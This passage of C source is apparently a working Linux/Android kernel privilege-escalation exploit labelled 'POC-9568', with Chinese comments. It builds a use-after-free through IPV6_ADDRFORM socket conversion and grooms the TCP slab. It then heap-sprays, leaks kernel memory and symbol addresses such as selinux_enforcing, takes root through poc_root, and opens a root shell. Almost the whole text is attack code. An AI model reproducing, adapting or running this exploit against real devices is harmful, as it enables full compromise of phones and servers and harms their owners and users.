		ret = setsockopt(bind_fd[i], SOL_SOCKET, SO_REUSEADDR, (const void *)&reuse, sizeof(reuse));
		if(ret < 0){
			printf("[POC-9568] [ERROR] [%3d] set socket bind_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
	}
	/*************************************************************************/

	fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
	if(fd < 0){
		printf("[POC-9568] [ERROR] [%3d] get socket ipv6 fd failed!\n", __LINE__);
		goto err;
	}

	memset(&bind_addr, 0, sizeof(bind_addr));
	bind_addr.sin6_family = AF_INET6;
	bind_addr.sin6_port = ntohs(unuse_port+1);

	memset(&client_addr1, 0, sizeof(client_addr1));
	client_addr1.sin_family = AF_INET;
	client_addr1.sin_port = ntohs(unuse_port+1);
	client_addr1.sin_addr.s_addr = inet_addr("127.0.0.1");

	memset(&client_addr2, 0, sizeof(client_addr2));
	client_addr2.sin_family = AF_INET;
	client_addr2.sin_port = ntohs(unuse_port+2);
	client_addr2.sin_addr.s_addr = inet_addr("127.0.0.1");

	memset(&unsp, 0, sizeof(unsp));
	unsp.sa_family = AF_UNSPEC;

	ret = bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket ipv6 fd failed!\n", __LINE__);
		goto err;
	}

	ret = listen(fd, 5);
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] listen socket ipv6 fd failed!\n", __LINE__);
		goto err;
	}

	client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(client_fd < 0){
		printf("[POC-9568] [ERROR] [%3d] get socket client_fd failed!\n", __LINE__);
		goto err;
	}

	connect(client_fd, (struct sockaddr *)&client_addr1, sizeof(client_addr1));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] connect socket client_fd failed!\n", __LINE__);
		goto err;
	}

	new_fd = accept(fd, NULL, NULL);
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] accept socket ipv6 fd failed!\n", __LINE__);
		goto err;
	}
	close(fd);
	fd = 0;

	val = AF_INET;
	ret = setsockopt(new_fd, SOL_IPV6, IPV6_ADDRFORM, &val, sizeof(val));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] set socket new_fd failed!\n", __LINE__);
		goto err;
	}
	ret = setsockopt(new_fd, SOL_SOCKET, SO_REUSEADDR, (const void *)&val, sizeof(val));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] set socket new_fd failed!\n", __LINE__);
		goto err;
	}

	ret = connect(new_fd, &unsp, sizeof(unsp));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] connect socket new_fd failed!\n", __LINE__);
		goto err;
	}

	memset(&bind_addr4, 0, sizeof(bind_addr4));
	bind_addr4.sin_family = AF_INET;
	bind_addr4.sin_port = ntohs(unuse_port+2);

	ret = bind(new_fd, (struct sockaddr *)&bind_addr4, sizeof(bind_addr4));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket new_fd failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}

	ret = listen(new_fd, 5);
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] listen socket new_fd failed!\n", __LINE__);
		goto err;
	}

	client_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(client_fd2 < 0){
		printf("[POC-9568] [ERROR] [%3d] get socket client_fd2 failed!\n", __LINE__);
		goto err;
	}

	/*************************************************************************/
	/* 2、创建大量tcp socket，填充tcp socket slub上面的空洞 */
	for(i = 0; i < run_out_num; i++){
		run_out_fd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(run_out_fd[i] < 0){
			printf("[POC-9568] [ERROR] [%3d] get socket run_out_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
	}

	/*************************************************************************/
	/* 3、构造UAF数据，并绑定端口 */
	/* 3.1、创建一个wrongzone socket，用于构造UAF数据 */
	ret = connect(client_fd2, (struct sockaddr *)&client_addr2, sizeof(client_addr2));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] connect socket client_fd2 failed!\n", __LINE__);
		goto err;
	}
	newest_fd = accept(new_fd, NULL, NULL);
	if(newest_fd < 0){
		printf("[POC-9568] [ERROR] [%3d] accept socket new_fd failed!\n", __LINE__);
		goto err;
	}

	/*************************************************************************/
	/* 3.2、依次创建tcp socket，用于构造UAF数据 */
	for(i = 0; i < FOLLOW_NUM; i++){
		follow_fd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(follow_fd[i] < 0){
			printf("[POC-9568] [ERROR] [%3d] get socket follow_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
		ret = setsockopt(follow_fd[i], SOL_SOCKET, SO_REUSEADDR, (const void *)&reuse, sizeof(reuse));
		if(ret < 0){
			printf("[POC-9568] [ERROR] [%3d] set socket follow_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
	}

	/*************************************************************************/
	/* 3.3、依次绑定follow_fd_0、bind_sk、follow_fd_1未使用端口，构造链表 */
#ifdef LEAK_NORMAL_SOCK
	ret = bind(bind_fd[2], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket bind_fd[2] failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}
	ret = bind(bind_fd[1], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket bind_fd[1] failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}
#endif
	ret = bind(follow_fd[0], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket follow_fd[0] failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}
	ret = bind(bind_fd[0], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket bind_fd[0] failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}
#ifdef ARCH_ARM32
	ret = bind(follow_fd[1], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
#else
	ret = bind(follow_fd[2], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
#endif
	if(ret < 0){
		printf("[POC-9568] [ERROR] [%3d] bind socket follow_fd[2] failed!\n", __LINE__);
		unuse_port = unuse_port + 3;
		goto err;
	}
	/*************************************************************************/
	/* 3.4、释放wrongzone_sk */
	close(newest_fd);
	newest_fd = 0;

	/* 实际释放内存的操作会延后 */
	for(i = 0; i < 50000; i++) {
		close(dup(0));
	}

	/*************************************************************************/
	/* 3.5、创建大量tcp socket，将slub（Evil TCP slub）填满 */
	for(i = 0; i < info->tail_fill_num; i++){
		make_dup_fd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(make_dup_fd[i] < 0){
			printf("[POC-9568] [ERROR] [%3d] get socket make_dup_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
		/* 设置标记 */
		rcvbuf = RCVBUF_BASE + i;
		ret = setsockopt(make_dup_fd[i], SOL_SOCKET, SO_RCVBUF, (const void *)&rcvbuf, sizeof(rcvbuf));
		if(ret){
			printf("[POC-9568] [ERROR] [%3d] set socket make_dup_fd[%d] SO_RCVBUF failed!\n", __LINE__, i);
			goto err;
		}
#ifdef POC_TEST
		ret = getsockopt(make_dup_fd[i], SOL_SOCKET, SO_RCVBUF, (void *)&rcvbuf, (socklen_t *)&len);
		if(ret){
			printf("[POC-9568] [ERROR] [%3d] get socket make_dup_fd[%d] SO_RCVBUF failed!\n", __LINE__, i);
			goto err;
		}
		printf("   >>>>>> make_dup_fd[%d] %d, %d\n", i, rcvbuf, len);
#endif
	}

	/*************************************************************************/
	/* 3.6、通过sk_rcvbuf字段来确定与follow_sk_0,1重叠的sock */
	for(i = 0; i < FOLLOW_NUM; i++){
		ret = getsockopt(follow_fd[i], SOL_SOCKET, SO_RCVBUF, (void *)&rcvbuf, (socklen_t *)&len);
		if(ret){
			printf("[POC-9568] [ERROR] [%3d] get socket follow_fd[%d] SO_RCVBUF failed!\n", __LINE__, i);
			goto err;
		}
		if(/*(rcvbuf < RCVBUF_DEFN) &&*/ ((rcvbuf/2 - RCVBUF_BASE) < info->tail_fill_num)){
			dup_fd[i] = make_dup_fd[rcvbuf/2 - RCVBUF_BASE];
#ifdef POC_TEST
			printf("   >>>>>> follow_fd[%d] %d, %d, %d\n", i, rcvbuf, len, rcvbuf/2 - RCVBUF_BASE);
#endif
		}
		else{
			printf("[POC-9568] [ERROR] create uaf data failed! follow_fd[%d] %d, %d\n", i, rcvbuf, len);
			goto err;
		}
	}

#ifdef POC_TEST
	for(i = 0; i < info->tail_fill_num; i++){
		close(make_dup_fd[i]);
	}
	for(i = 0; i < FOLLOW_NUM; i++){
		ret = setsockopt(follow_fd[i], SOL_SOCKET, SO_REUSEADDR, (const void *)&reuse, sizeof(reuse));
		if(ret < 0){
			printf("[POC-9568] [ERROR] [%3d] set socket follow_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
	}

	while(1);
#endif

	/*************************************************************************/
	/* 3.7、绑定dup_fd[0,2]到端口unuse_port */
	for(i = 0; i < 2; i++){
#ifdef ARCH_ARM32
		ret = setsockopt(dup_fd[i], SOL_SOCKET, SO_REUSEADDR, (const void *)&reuse, sizeof(reuse));
#else
		ret = setsockopt(dup_fd[i*2], SOL_SOCKET, SO_REUSEADDR, (const void *)&reuse, sizeof(reuse));
#endif
		if(ret < 0){
			printf("[POC-9568] [ERROR] [%3d] set socket dup_fd[%d] failed!\n", __LINE__, i*2);
			goto err;
		}

#ifdef ARCH_ARM32
		ret = bind(dup_fd[i], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
#else
		ret = bind(dup_fd[i*2], (struct sockaddr *)&bind_addr4_list, sizeof(bind_addr4_list));
#endif
		if(ret < 0){
			printf("[POC-9568] [ERROR] [%3d] bind socket dup_fd[%d] failed!\n", __LINE__, i*2);
			unuse_port = unuse_port + 3;
			goto err;
		}
	}

	/*************************************************************************/
	/* 4、释放对象，使UAF所在slab被伙伴系统回收 */
	/* 4.1、关闭run_out_fd（在Evil TCP slub上的一个对象），使Evil TCP slub回收到cpu partial */
	close(run_out_fd[run_out_num - 1]);
	run_out_fd[run_out_num - 1] = 0;
	/* 4.2、关闭部分make_dup_fd在不同slub上的一个对象，使Evil TCP slub回收到node partial */
	for(i = 0; i < info->tail_fill_num; i++) {
		if((i % info->object_nums) == 0) {
			close(make_dup_fd[i]);
			make_dup_fd[i] = 0;
		}
	}

	/*************************************************************************/
	/* 4.3、关闭make_dup_sk[0]在Evil TCP slub上的其他对象 */
	for(i = 1; i < info->object_nums; i++) {
		close(make_dup_fd[i]);
		make_dup_fd[i] = 0;
	}

	/*************************************************************************/
	/* 4.4、按顺序close所有run_out_fd，使其释放Evil TCP slub，回到伙伴系统 */
	for(i = run_out_num - 2; i >= 0; i--) {
		close(run_out_fd[i]);
		run_out_fd[i] = 0;
	}

	/*************************************************************************/
	/* 4.5、释放剩余对象 */
	for(i = 0; i < info->tail_fill_num; i++) {
		if(make_dup_fd[i] != 0) {
			close(make_dup_fd[i]);
			make_dup_fd[i] = 0;
		}
	}

	/*************************************************************************/
	close(client_fd);
	client_fd = 0;
	close(client_fd2);
	client_fd2 = 0;
	close(new_fd);
	new_fd = 0;

	for(i = 0; i < FOLLOW_NUM; i++){
		uaf_fd[i] = follow_fd[i];
	}
	for(i = 0; i < BIND_NUM; i++){
		leak_fd[i] = bind_fd[i];
	}
	res = 0;

err:
	if(fd > 0)
		close(fd);
	if(client_fd > 0)
		close(client_fd);
	if(client_fd2 > 0)
		close(client_fd2);
	if(new_fd > 0)
		close(new_fd);
	if(newest_fd > 0)
		close(newest_fd);
	for(i = 0; i < run_out_num; i++){
		if(run_out_fd[i] > 0)
			close(run_out_fd[i]);
		run_out_fd[i] = 0;
	}
	for(i = 0; i < info->tail_fill_num; i++){
		if(make_dup_fd[i] > 0)
			close(make_dup_fd[i]);
		make_dup_fd[i] = 0;
	}

	return res;
}

int poc_main(void)
{
	int i, j, k;
	int ret, rep_count = 0, rep_error = 0;
	int uaf_fd[UAFGP_NUM][FOLLOW_NUM] = {0,};
	int leak_fd[UAFGP_NUM][BIND_NUM] = {0,};
	int uafgp_num = 0;
	int unuse_port = UNUSE_PORT;

	int sec = 0;
#ifndef ARCH_ARM32
	long nsec = 0;
#else
	int nsec = 0;
#endif
	struct timespec time[3];

	pid_t pid;
	unsigned long high_free;
	int tcount = 0;

	/* 设置一次制造多少个UAF数据组，必须<=UAFGP_NUM */
	uafgp_num_max = 10;

restart:
#ifdef ARCH_ARM32
	if((pid = fork()) < 0){
		printf("   fork failed!\n");
	}
	else if(pid == 0){
        int i, j, k;
		unsigned long *mem_free_addr;
		int mem_free_count;

		bind_cpu(2);

		mem_free_count = expend_memory("MemFree", &mem_free_addr);

		//signal(SIGUSR1,received_signal);

		while(1){
			;
			//get_meminfo();
		}
		//printf("   child exit\n");
		return 0;
	}

	sleep(1);

#if 1
	while(tcount < 1000){
		get_mem_info("HighFree", &high_free);
		if(high_free < 40000){
			break;
		}
		usleep(2000);
		tcount++;
	}
//	printf("   high_free = %ld kB\n", high_free);
#endif
//	get_meminfo();
#endif

	/* 创建 uafgp_num_max 个UAF对象，增加堆喷成功率 */
	for(; uafgp_num < uafgp_num_max; uafgp_num++){
		if(create_uafdata(unuse_port, uaf_fd[uafgp_num], leak_fd[uafgp_num])){
			rep_error++;
		}
		unuse_port += 3;
	}
	printf("2、成功构造UAF数据，uafgp_num = %d\n", uafgp_num);
	uafgp_num = uafgp_num_max;

/*************************************************************************/
	/* 5、开始堆喷，获取UAF数据 */
respray:
	printf("3、开始堆喷\n");
	start_heap_spray();

	/* 5.1、检查是否堆喷成功 */
	set_check_flag((s64)STAMP_FLAGS, &sec, &nsec);
//	printf("   struct timespec = 0x%x\n", (unsigned int)sizeof(struct timespec));
	printf("   sizeof time[0].tv_sec = 0x%x; time[0].tv_nsec = 0x%x\n", (unsigned int)sizeof(time[0].tv_sec), (unsigned int)sizeof(time[0].tv_nsec));

	for(k = 0; k < uafgp_num; k++){
		ioctl(uaf_fd[k][0], SIOCGSTAMPNS, &time[0]);
#ifdef ARCH_ARM32
		ioctl(uaf_fd[k][1], SIOCGSTAMPNS, &time[1]);
//		ioctl(uaf_fd[k][2], SIOCGSTAMPNS, &time[2]);
#else
		ioctl(uaf_fd[k][2], SIOCGSTAMPNS, &time[1]);
#endif
		if((sec == time[0].tv_sec && nsec == time[0].tv_nsec && 
			sec == time[1].tv_sec && nsec == time[1].tv_nsec) /*|| 
			(sec == time[0].tv_sec && nsec == time[0].tv_nsec && 
			sec == time[2].tv_sec && nsec == time[2].tv_nsec) || 
			(sec == time[2].tv_sec && nsec == time[2].tv_nsec && 
			sec == time[1].tv_sec && nsec == time[1].tv_nsec) */){
			struct skaddr sk;

			printf("4、堆喷成功, k = %d, uafgp_num = %d\n", k, uafgp_num);
//			sleep(3);
//			printf("   sec: %zd, nsec: %zd\n", sec, nsec);
//			printf("   time[0].tv_sec: %lu, time[0].tv_nsec: %lu\n", (unsigned long)time[0].tv_sec, (unsigned long)time[0].tv_nsec);
//			printf("   time[1].tv_sec: %lu, time[1].tv_nsec: %lu\n", (unsigned long)time[1].tv_sec, (unsigned long)time[1].tv_nsec);
//			printf("   time[2].tv_sec: %lu, time[2].tv_nsec: %lu\n", (unsigned long)time[2].tv_sec, (unsigned long)time[2].tv_nsec);

#ifdef ARCH_ARM32
			kill(pid, SIGKILL);
#endif

//#if (defined TEST_OFFSET_SKSTAMP || defined TEST_CALCULATE_SLAB)
			for (i = 0; i < mmap_count; i++) {
				memset(mmap_addr[i], 0, MMAP_HEAP_SPRAY_LEN);
			}
//#endif
			/* 5.2、泄漏内核信息 */
			close(leak_fd[k][0]);
			leak_fd[k][0] = 0;
#ifdef LEAK_NORMAL_SOCK
			close(leak_fd[k][1]);
			leak_fd[k][1] = 0;
#endif

			for(i = 0; i < 5000; i++) {
				close(dup(0));
			}
			usleep(1000);
			/* 5.3、获取UAF数据地址 */
			ret = find_uaf_data(&sk);
			if(ret < 0){
				printf("   寻找UAF数据失败，重新开始\n");
				goto end;
			}
#ifdef TEST_CALCULATE_SLAB
			rep_count = REP_COUNT_MAX;
			goto end;
#endif
#ifdef TEST_OFFSET_SKSTAMP
			ioctl(uaf_fd[k][0], SIOCGSTAMPNS, &time[0]);
#ifdef ARCH_ARM32
			ioctl(uaf_fd[k][1], SIOCGSTAMPNS, &time[1]);
#else
			ioctl(uaf_fd[k][2], SIOCGSTAMPNS, &time[1]);
#endif
			printf("   time[0].tv_sec: %ld, time[0].tv_nsec: %ld, time[1].tv_sec: %ld, time[1].tv_nsec: %ld\n", 
					(long)time[0].tv_sec, (long)time[0].tv_nsec, (long)time[1].tv_sec, (long)time[1].tv_nsec);
			if((long)time[0].tv_nsec - nsec < 96)
				printf("   >>>>>> offset_sock_skstamp = 0x%lx\n", ((long)time[0].tv_nsec - nsec) * 8);
			else
				printf("   >>>>>> offset_sock_skstamp 计算错误，请重新运行\n");
			rep_count = REP_COUNT_MAX;
			goto end;
#endif

			/* 6、伪造数据，泄漏内核符号表 */
			if(fake_sock_data(&sk))
				goto end;
#ifdef TEST_OFFSET_SECURITY
			len = 4;
			ret = getsockopt(uaf_fd[k][0], SOL_SOCKET, SO_RCVBUF, (void *)&rcvbuf, (socklen_t *)&len);
			if(ret)
				printf("   >>>>>> offset_sock_sksecurity 不在设置范围内, 直接死机\n");
			else
				printf("   >>>>>> offset_sock_sksecurity 在设置范围内\n");
			rep_count = REP_COUNT_MAX;
			goto end;
#endif
#ifdef TEST_OFFSET_SKFILTER
			len = 4;
			ret = getsockopt(uaf_fd[k][0], SOL_SOCKET, SO_RCVBUF, (void *)&rcvbuf, (socklen_t *)&len);
			if(ret)
				printf("   >>>>>> offset_sock_skfilter 计算错误，请重新运行\n");
			else
				printf("   >>>>>> offset_sock_skfilter = 0x%x\n", rcvbuf * 4 + 4);
			rep_count = REP_COUNT_MAX;
			goto end;
#endif

			if(copy_kernel(uaf_fd[k][0]))
				goto end;
			
			printf("5、拷贝内核成功\n");

			if(find_kallsyms(store_kern_data, info->kern_copy_size))
				goto end;

			printf("6、成功找到内核符号表\n");
			printf("   [0x%lx] tcp_prot\n", kallsyms_lookup_name("tcp_prot"));
			printf("   [0x%lx] _text\n", kallsyms_lookup_name("_text"));
			printf("   [0x%lx] kernel_sock_ioctl\n", kallsyms_lookup_name("kernel_sock_ioctl"));
			printf("   [0x%lx] init_task\n", kallsyms_lookup_name("init_task"));
			printf("   [0x%lx] selinux_enforcing\n", kallsyms_lookup_name("selinux_enforcing"));

			/* 7、获取root权限 */
			printf("7、获取root权限\n");
			poc_root(uaf_fd[k][0]);

			free(store_kern_data);

			ret = 0;
			uafgp_num = 0;
			rep_count = REP_COUNT_MAX;
			goto end;
		}
		else{
#ifdef POC_TEST
			printf("   sec: %zd, nsec: %zd\n", sec, nsec);
			printf("   time[0].tv_sec: %lu, time[0].tv_nsec: %lu\n", (unsigned long)time[0].tv_sec, (unsigned long)time[0].tv_nsec);
			printf("   time[1].tv_sec: %lu, time[1].tv_nsec: %lu\n", (unsigned long)time[1].tv_sec, (unsigned long)time[1].tv_nsec);
			printf("   time[2].tv_sec: %lu, time[2].tv_nsec: %lu\n", (unsigned long)time[2].tv_sec, (unsigned long)time[2].tv_nsec);
#endif
		}
	}
end:
	/* 如果堆喷失败再造10组UAF数据 */
	uafgp_num_max += 10;
	unmap_heap_spray();
	usleep(1000);
	rep_count++;
#ifdef ARCH_ARM32
	kill(pid, SIGKILL);
	usleep(20000);
#endif
	//rep_error++;
	/* 出错进行重试 */
	if(rep_count < REP_COUNT_MAX && rep_error < REP_ERROR_MAX){
		usleep(100);
		goto restart;
	}
	if(rep_error == REP_ERROR_MAX && uafgp_num){
		usleep(100);
		goto respray;
	}

	for(j = 0; j < UAFGP_NUM; j++){
		for(i = 0; i < BIND_NUM; i++){
			if(leak_fd[j][i] > 0){
				close(leak_fd[j][i]);
				leak_fd[j][i] = 0;
			}
		}
	}
	for(j = 0; j < UAFGP_NUM; j++){
		for(i = 0; i < FOLLOW_NUM; i++){
			uaf_fd[j][i] = 0;
		}
	}

	return ret;
}


int poc_init(void)
{
	int n = 0;
	
	bind_cpu(0);

	printf("1、准备工作，获取系统信息\n");

	info = get_devinfo();
	printf("   设备信息：%s, 内核版本信息：%s\n", info->devname, info->kernver);

	store_kern_data = malloc(info->kern_copy_size);
	if(!store_kern_data){
		printf("[ERROR] 申请内存失败，退出\n");
		return -1;
	}
	memset(store_kern_data, 0, info->kern_copy_size);

	return 0;
}


int main(void)
{
	int ret = 0;

	ret = poc_init();
	if(ret){
		return ret;
	}

	poc_main();

	system("/system/bin/sh");

	while(1)
		sleep(1);

	return 0;
}
